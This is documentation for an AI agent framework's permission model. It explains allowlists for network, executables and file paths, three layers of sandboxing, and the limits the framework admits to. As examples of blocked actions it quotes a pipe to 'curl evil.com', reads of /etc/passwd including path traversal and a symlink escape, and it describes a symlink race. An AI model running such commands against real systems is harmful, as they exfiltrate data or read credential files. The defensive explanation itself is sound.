---
title: "The permission model"
description: "The four permission types, what each one allows and blocks, the three enforcement layers and where the boundaries stop today."
---

A service agent runs at 3am, triggered by a webhook, on a machine nobody is watching.
There is no one to ask "may I run this?", so the question has to be answered before the
agent starts. That is what the `permissions:` block is for: you declare once, in config,
what the agent is allowed to touch, and everything else is denied. There is no prompt at
runtime. When the agent tries something outside its grants, the denial goes back to it as
an ordinary tool result and it carries on with that as context for its next turn.

The default is deny. An agent with no `permissions:` block can touch nothing, and there
is no way to grant more while the agent is running. Widening a boundary means editing the
file and redeploying, so a capability change gets reviewed and versioned like any other
config change.

## The four permission types

Permissions come in four axes: `net`, `run`, `read` and `write`. Each one is an
allowlist, and each native tool only exists for the agent when its axis grants something.
This means that no unused tool schema takes up context, and there is nothing sitting
there to misuse.

### net: which hosts the agent can call

```yaml
permissions:
  net: [api.github.com, "*.internal.example.com"]
```

With this block, `http_request` can reach `api.github.com` and any subdomain of
`internal.example.com`, such as `mcp.internal.example.com`. A request to any other host
comes back as `permission denied: net access to "evil.com" is not in the agent's
permissions.net allowlist`. The wildcard covers subdomains only; `internal.example.com`
itself needs its own entry. With no `net:` list, the `http_request` tool does not exist
for the agent at all.

### run: which executables the agent can spawn

```yaml
permissions:
  run: [gh, grep]
```

With this block, `run_bash` can execute `gh issue list | grep bug`. The framework does
not trust the shell: it extracts every executable from pipes and chains and checks each
one against the list, so `gh issue list | curl evil.com` is denied because `curl` is
missing from the allowlist. Command substitution (`$(...)`, backticks, `<(...)`) is
rejected outright, because there is no way to check what is inside it before it runs.
Executables are matched by basename, so `/usr/bin/gh` counts as `gh`.

### read and write: which paths the agent can touch

```yaml
permissions:
  read: [/workspace]
  write: [/workspace/out]
```

With this block, `read_file` can open `/workspace/notes.md` and `write_file` can create
`/workspace/out/report.md`. Reading `/etc/passwd` is denied, and so is the traversal
attempt `/workspace/../etc/passwd`, because paths are normalized before the check. Writes
outside `/workspace/out` are denied, including the rest of `/workspace`.

A prefix covers everything beneath it, so `read: [/workspace]` grants every file in every
subdirectory. What it does not grant is a file that merely looks like it lives there. The
tools resolve a path's symlinks before authorizing it, and they act on the resolved path,
so a link at `/workspace/escape` pointing at `/etc` gives the agent no more reach than it
already had: `/workspace/escape/passwd` is checked as `/etc/passwd`, and denied. Links
that stay inside the root keep working, which is what lets an allowed root be a symlink
itself, the way `/tmp` is on macOS.

An agent with an empty `permissions:` block carries only `current_time`, plus
`read_skill` if it has [skills](skills.md). The full toolset and what makes each tool
appear is in [Tools](tools.md); syntax, matching rules and secrets are in
[Permissions](permissions.md).

## The three layers

We don't trust any single boundary to hold. Enforcement nests in three layers, and each
layer assumes the one inside it can fail.

1. **The permission engine.** Framework code checks every native tool call against the
   allowlists above, and every decision, allowed and denied, lands in the audit trail.
2. **The Deno sandbox.** The agent process itself is launched with only the rights it
   needs: in the base image, reads scoped to `/agent`, `/skills`, `/data` and
   `/run/secrets`, writes to `/data` and subprocess spawning to `bash` alone. The runtime
   enforces this underneath the framework's own code, so a bug in the framework can't
   grant an access the runtime was never given. An agent that spawns nothing runs under a
   tighter set still, with its net allowlist compiled into `--allow-net` ([hermetic
   mode](#hermetic-mode)). `af flags agent.yaml` prints the flags a config runs under.
3. **The container.** This is the outer wall and the unit of isolation. `bash`
   subprocesses escape the Deno sandbox by design, and the container is what contains
   them. That is also why there is no "run on the host" mode: the framework refuses to
   run where its outermost layer is missing.

Subprocesses and MCP servers receive only the env vars their config block grants, plus
`PATH`/`HOME`, and secret values are injected server side, so they never enter the
model's context.

## Hermetic mode

The subprocess escape hatch only exists when your config asks for it. If an agent has no
`permissions.run` grants and no stdio MCP servers, then nothing runs outside the Deno
sandbox, and every byte the agent sends leaves through the runtime. That means the runtime
itself can hold the whole net allowlist, and it does.

When an agent like that starts, the container entrypoint reads the config and re-execs
itself with `--allow-net` narrowed to the hosts the agent is actually allowed to reach,
before it has connected to anything. You don't turn this on. It's what qualifying agents
get, and `af flags` shows you the flags they run under:

```
$ af flags agent.yaml
--allow-env --allow-read=/agent,/skills,/data,/looped,/deno-dir,/run/secrets \
  --allow-write=/data --allow-net=0.0.0.0:9090,api.anthropic.com,api.github.com
```

The framework works out the hosts it needs for itself, and they all come from the config:
the model endpoint, the hosts each trigger talks to (Discord's API and its gateway, the
Telegram bot API, your IMAP and SMTP servers), the URL of every HTTP MCP server, and the
ports the status server and any webhook trigger listen on. Everything else in
`permissions.net` is yours. A host that appears in neither is refused by the runtime, so a
prompt injection that talks an MCP client or a provider SDK into calling an attacker's
endpoint doesn't get out.

One thing will keep an agent out of hermetic mode, and `af validate` names it: a
subprocess. Any `permissions.run` entry, or an MCP server declared with `command:` rather
than `url:`, spawns a process that leaves the Deno sandbox, and once it has, the runtime
cannot hold it. The container is that agent's egress boundary.

Wildcard hosts compile. Deno's `--allow-net` accepts `*.example.com`, so a config that
grants subdomains still qualifies for hermetic mode. One nuance is worth knowing about:
Deno's wildcard also covers the apex, which means at the sandbox layer `*.example.com`
reaches `example.com` too. The permission engine keeps enforcing the stricter
subdomains-only pattern for every `http_request` call; the wider match applies to the
runtime's own clients, and we took that one extra host over leaving the whole net open
for wildcard configs.

The tradeoff is deliberate. Hermetic mode rewards the absence of subprocesses; it doesn't
forbid their presence. The CLI-plus-skill pattern is half of what this framework is for.

## Where the boundaries stop today

The model above is honest about its edges, and you should know where they are before you
rely on it.

**An MCP server's network traffic bypasses `permissions.net`.** The engine checks hosts
for the native `http_request` tool; whatever outbound calls an MCP server makes happen
outside it. When you declare a server under `tools.mcp`, you are trusting where it talks
to. Your controls on the tool side are the `include:` filter (a tool you didn't include
does not exist for the agent), the `readonly:` flag and the scoped `env:` block, and
every MCP call lands in the audit trail; the server's own egress is bounded by the
container.

**Network egress is open below the app layer for an agent that spawns things.** If your
agent has `permissions.run` grants or a stdio MCP server, something runs outside the Deno
sandbox, and per-host enforcement happens only in the permission engine. A `gh` you
allowed will talk to whatever it wants. If egress matters for that agent, restrict it at
the container layer with your network setup.

Agents that spawn nothing don't have this problem. See below.

**`run` matches by basename.** `run: [gh]` allows any executable named `gh`, wherever it
lives. Inside the hardened base image that is fine in practice; if you derive an image
that widens the writable paths, keep in mind that the container is the backstop.

**Path grants are enforced in the engine, and only there.** Deno's `--allow-read=/workspace`
follows a symlink out of `/workspace` as readily as the tools once did, so the runtime
layer is not a second opinion on where a path leads. The engine resolves symlinks and
authorizes the destination, and the container is the layer that decides whether the
destination exists in the agent's filesystem at all. If a path must be unreachable, do not
mount it.

**Resolving a path and opening it are two steps.** The tools resolve, authorize, then act
on the resolved path, so a link cannot redirect a call that was already checked. What
remains is the classic gap between those steps: a component swapped for a symlink in the
microseconds between them would be followed. Tool calls within a run are serialized, so an
agent cannot race itself, and closing the gap properly needs `openat2`-style syscalls that
Deno does not expose. An attacker who can already write to the agent's allowed root to win
that race has the box.

The result is that you can run an agent unattended and know its worst case in advance:
the agent can reach exactly what its grants say, the runtime and the container hold that
boundary underneath the framework's own code, and the remaining edges are outlined
above. The config itself is hard to get wrong without noticing, because unknown keys are
rejected at load time and anything you leave out is denied.
